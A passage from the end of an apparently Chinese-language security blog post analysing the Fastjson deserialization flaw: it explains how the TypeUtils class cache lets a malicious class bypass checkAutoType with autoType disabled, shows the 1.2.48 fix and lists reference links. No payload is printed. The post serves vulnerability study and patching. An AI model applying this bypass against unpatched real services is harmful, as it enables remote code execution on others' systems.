</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6</span><span>    clazz <span style=color:#ff79c6>=</span> deserializers<span style=color:#ff79c6>.</span><span style=color:#50fa7b>findClass</span><span style=color:#ff79c6>(</span>typeName<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>com.alibaba.fastjson.util.TypeUtils</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> Class<span style=color:#ff79c6>&lt;?&gt;</span> getClassFromMapping<span style=color:#ff79c6>(</span>String className<span style=color:#ff79c6>){</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#ff79c6>return</span> mappings<span style=color:#ff79c6>.</span><span style=color:#50fa7b>get</span><span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>除了在 deserializers 里面寻找, 还会在 TypeUtils 的缓存里面寻找, 而刚刚我们通过 Class 的反序列化方法, 将我们想要的类放入了缓存中. 这就到达了绕过的效果, 意味着就算我们关闭了 autoType, 照样可以进行利用, 漏洞的发现者 tql.</p><p>这里的本意, 应该是加快速度, 毕竟如果你之前加载过这个类, 当然是在白名单里面的, 但是问题出现在 Class 的反序列器也会调用 loadClass, 这是开发者忘记掉的. 导致恶意类被放入了缓存中, 绕过了检测.</p><h2 id=1248-修复>1.2.48 修复</h2><p>对应的修复</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span><span style=color:#8be9fd;font-style:italic>public</span> <span style=color:#8be9fd;font-style:italic>static</span> Class<span style=color:#ff79c6>&lt;?&gt;</span> loadClass<span style=color:#ff79c6>(</span>String className<span style=color:#ff79c6>,</span> ClassLoader classLoader<span style=color:#ff79c6>)</span> <span style=color:#ff79c6>{</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2</span><span>    <span style=color:#ff79c6>return</span> loadClass<span style=color:#ff79c6>(</span>className<span style=color:#ff79c6>,</span> classLoader<span style=color:#ff79c6>,</span> <span style=color:#ff79c6>false</span><span style=color:#ff79c6>);</span>
</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3</span><span><span style=color:#ff79c6>}</span>
</span></span></code></pre></div><p>将 loadClass 的 cache 设为 false, 这样反序列 Class 对象的时候, 就不会将结果放入缓存中, 自然也就无法绕过 checkAutoType 了.</p><h2 id=本文参考推荐阅读>本文参考/推荐阅读</h2><p>[1] <a href=http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/>http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a><br>[2] <a href=https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html>https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a><br>[3] <a href=https://kingx.me/Details-in-FastJson-RCE.html>https://kingx.me/Details-in-FastJson-RCE.html</a><br>[4] <a href=https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/>https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/java>java</a></li><li><a href=/tags/web>web</a></li></ul></nav></div></article></main><footer><div class=footer-info>© 2017 - 2022, rmb122</div><div style=display:flex><span class=border></span><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a><a class=soc href=https://rmb122.com/index.xml title=RSS><i data-feather=rss></i></a></div></footer><script>feather.replace()</script><script async src="https://www.googletagmanager.com/gtag/js?id=G-1MH3QGWHV5"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-1MH3QGWHV5",{anonymize_ip:!1})}</script><script src=https://rmb122.com/js/medium-zoom.min.js></script>
<script>for(let e of document.getElementsByTagName("img"))mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"rgba(0, 0, 0, 0.8)"})</script></div></body></html>